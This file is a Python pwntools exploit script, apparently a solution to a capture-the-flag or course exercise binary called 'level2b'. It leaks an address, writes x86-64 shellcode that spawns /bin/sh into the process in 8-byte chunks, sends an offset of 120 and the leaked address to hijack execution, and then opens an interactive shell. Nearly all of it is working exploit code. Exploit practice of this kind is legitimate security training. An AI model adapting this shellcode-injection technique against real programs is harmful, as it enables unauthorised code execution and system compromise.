from pwn import *
from struct import unpack
SHELLCODE = b"\x90\x90\x90\x90\x90" # shellcode placeholder

shellcode_chunks = [b"\x50\x48\x31\xd2\x48\x31\xf6\x48", b"\xbb\x2f\x62\x69\x6e\x2f\x2f\x73", b"\x68\x53\x54\x5f\xb0\x3b\x0f\x05"]
  
context.terminal = ["tmux", "splitw", "-h"]  

OFFSET = 120

# level2b = gdb.debug("../release/level2b")
level2b = process("../release/level2b")

print(level2b.readline())

try:
    level2b.sendline(SHELLCODE)
except Exception as e:
    print(e)

msg = level2b.readline()

print(msg)


import re
addr = re.search(b"0x[a-f0-9]+", msg).group(0) # Isloate the address we need to write
addr = int(addr, base=16) # Convert the address to an integer
print(level2b.readline())


# Write the shellcode dynamically

for idx, chunk in enumerate(shellcode_chunks):
    print("sending {}".format(idx * 8).encode())
    level2b.sendline("{}".format(idx * 8).encode())
    print(level2b.recvline())
    print("sending {}".format(unpack("<Q", chunk)[0]).encode())
    level2b.sendline("{}".format(unpack("<Q", chunk)[0]).encode())
    print(level2b.recvline())


print("The offset is {}".format(OFFSET))
try:
    level2b.sendline("{}".format(OFFSET).encode("utf-8")) # Send the offset to the program
except Exception as e:
    print(e)
    
print(level2b.readline())

try:
    print(level2b.sendline("{}".format(addr).encode("utf-8"))) # Send the address to the program
except Exception as e:
    print(e)
print(level2b.readline())

level2b.interactive()



